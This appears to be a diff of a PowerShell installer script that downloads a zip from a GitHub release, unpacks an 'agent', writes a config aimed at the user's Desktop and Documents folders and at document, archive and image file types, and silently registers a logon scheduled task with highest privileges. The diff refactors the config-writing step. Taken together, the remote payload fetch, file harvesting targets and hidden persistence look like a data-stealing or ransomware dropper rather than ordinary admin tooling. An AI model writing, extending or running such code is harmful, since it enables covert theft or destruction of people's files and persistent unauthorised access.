@@ -6,22 +6,27 @@ $cfg = "$dir\agent.json"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
-
 Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1.0/itagnt.zip" -OutFile $zip -UseBasicParsing
 Expand-Archive -Path $zip -DestinationPath $dir -Force
 Remove-Item $zip -Force
 
 $agentId = [guid]::NewGuid().ToString()
 
-@{
-    AgentId          = $agentId
-    TargetFolders    = @(
-        [Environment]::GetFolderPath("Desktop"),
-        [Environment]::GetFolderPath("MyDocuments")
+$configObj = @{
+    AgentId = $agentId
+    TargetFolders = @(
+        "C:\Users\$env:USERNAME\Desktop",
+        "C:\Users\$env:USERNAME\Documents"
     )
-    TargetExtensions = @(".doc",".docx",".xls",".xlsx",".ppt",".pptx",
-                         ".pdf",".txt",".csv",".zip",".rar",".jpg",".jpeg",".png")
-} | ConvertTo-Json -Depth 3 | Out-File -FilePath $cfg -Encoding UTF8 -Force
+    TargetExtensions = @(
+        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+        ".pdf", ".txt", ".csv", ".zip", ".rar", ".jpg", ".jpeg", ".png"
+    )
+}
+
+$json = $configObj | ConvertTo-Json -Depth 3
+$enc = New-Object System.Text.UTF8Encoding $false
+[System.IO.File]::WriteAllText($cfg, $json, $enc)
 
 cmd /c "schtasks /delete /tn itmgn /f" > $null 2>&1
 cmd /c "schtasks /create /tn itmgn /tr `"$exe`" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1
